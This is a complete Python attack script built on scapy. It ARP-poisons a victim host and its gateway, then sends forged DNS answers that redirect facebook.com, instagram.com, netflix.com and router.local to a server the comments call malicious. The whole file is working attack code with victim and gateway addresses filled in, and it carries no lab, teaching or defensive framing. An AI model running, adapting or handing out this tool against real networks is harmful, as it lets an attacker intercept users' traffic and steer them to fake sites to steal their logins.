#!/usr/bin/env python3
import scapy.all as scapy
import sys
import threading
import time
import os
from socket import gethostbyname

# Configuration
SPOOF_DOMAINS = ["facebook.com", "instagram.com", "netflix.com", "router.local"]
SPOOF_IP = "192.168.31.1"  # Your malicious server IP
INTERFACE = "eth0"          # Network interface to use
GATEWAY_IP = "192.168.31.1"  # Router's IP (run 'route -n' to find)
VICTIM_IP = "192.168.31.144" # Target IP (or use None for all hosts)

def enable_ip_forwarding():
    """Allow packet forwarding between interfaces"""
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    print("[✓] IP forwarding enabled")

def arp_spoof(target_ip, spoof_ip):
    """Send fake ARP replies to poison cache"""
    while True:
        pkt = scapy.ARP(op=2, pdst=target_ip, hwdst=scapy.getmacbyip(target_ip), 
                       psrc=spoof_ip)
        scapy.send(pkt, verbose=False)
        time.sleep(2)  # Refresh ARP cache every 2 seconds

def dns_spoof(pkt):
    try:
        if pkt.haslayer(scapy.DNSQR):
            queried_domain = pkt[scapy.DNSQR].qname.decode().rstrip(".")
            
            for domain in SPOOF_DOMAINS:
                if domain in queried_domain:
                    print(f"[+] Spoofing {queried_domain} -> {SPOOF_IP}")
                    
                    # Craft DNS response
                    spoofed_pkt = (
                        scapy.IP(dst=pkt[scapy.IP].src, src=pkt[scapy.IP].dst) /
                        scapy.UDP(dport=pkt[scapy.UDP].sport, sport=53) /
                        scapy.DNS(
                            id=pkt[scapy.DNS].id,
                            qr=1, 
                            aa=1,
                            qd=pkt[scapy.DNS].qd,
                            an=scapy.DNSRR(
                                rrname=pkt[scapy.DNSQR].qname,
                                ttl=600,
                                rdata=SPOOF_IP
                            )
                        )
                    )
                    # Send multiple times to ensure delivery
                    scapy.send(spoofed_pkt, verbose=False, count=3)
                    break
                    
    except Exception as e:
        print(f"[!] Error: {e}")

def start_attack():
    """Main attack function"""
    enable_ip_forwarding()
    
    # Start ARP spoofing threads
    print(f"[*] ARP spoofing {VICTIM_IP} -> Gateway {GATEWAY_IP}")
    threading.Thread(
        target=arp_spoof, 
        args=(VICTIM_IP, GATEWAY_IP),
        daemon=True
    ).start()
    
    threading.Thread(
        target=arp_spoof, 
        args=(GATEWAY_IP, VICTIM_IP),
        daemon=True
    ).start()
    
    # Start DNS sniffer
    print(f"[*] DNS spoofer active on {INTERFACE}")
    scapy.sniff(
        filter="udp port 53",
        iface=INTERFACE,
        store=False,
        prn=dns_spoof
    )

if __name__ == "__main__":
    # Check root privileges
    if os.geteuid() != 0:
        print("[!] Must run as root")
        sys.exit(1)
        
    start_attack()